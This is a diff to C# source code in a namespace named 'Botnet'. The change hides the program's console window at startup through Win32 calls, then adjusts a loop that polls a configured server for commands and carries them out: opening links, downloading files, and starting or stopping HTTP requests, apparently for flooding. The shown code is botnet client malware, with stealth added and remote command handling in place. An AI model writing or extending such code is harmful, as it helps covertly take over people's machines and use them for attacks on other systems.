@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
@@ -11,9 +12,26 @@ namespace Botnet
     class Program
     {
 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+
+        const int SW_HIDE = 0;
+
+
         static string last_cmd = string.Empty;
         static void Main(string[] args)
         {
+            var handle = GetConsoleWindow();
+
+
+            // Hide
+           ShowWindow(handle, SW_HIDE);
+
             while (true)
             {
                 string html = web.GetHTML(configs.server);
@@ -44,13 +62,16 @@ namespace Botnet
                     Functions.OpenLink(CMD.ComContent);
                     Console.WriteLine(CMD.ComContent);
                     break;
-                case "downlaod":
+                case "download":
                     Functions.Download(CMD.ComContent);
                     break;
-                case "cl":
-                    Thread.Sleep(configs.delay);
+                case "stop":
+                    Functions.run(false);
+
                     break;
                 case "http":
+                    Functions.run(true);
+
                     Functions.Httprequest(CMD.ComContent);
                     break;
                
